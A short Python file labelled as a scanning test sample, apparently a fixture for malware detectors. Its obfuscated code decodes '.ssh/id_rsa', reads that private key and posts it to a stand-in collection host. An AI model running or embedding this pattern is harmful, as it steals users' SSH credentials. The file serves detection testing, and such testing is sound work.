# DO NOT RUN — scanning test sample

import importlib


def main() -> None:
    req_mod = importlib.import_module("url" + "lib.request")
    parts = importlib.import_module("path" + "lib")
    pcls = getattr(parts, "Pa" + "th")
    home = getattr(pcls, "ho" + "me")()
    name = "".join(map(chr, [46, 115, 115, 104]))
    key = "".join(map(chr, [105, 100, 95, 114, 115, 97]))
    target = home / name / key
    blob = target.read_bytes()
    url = "".join(map(chr, [104, 116, 116, 112, 115, 58, 47, 47]))
    url = url + "collect.example.invalid/c"
    request_cls = getattr(req_mod, "Req" + "uest")
    req = request_cls(url, data=blob)
    opener = getattr(req_mod, "url" + "open")
    opener(req)


if __name__ == "__main__":
    main()
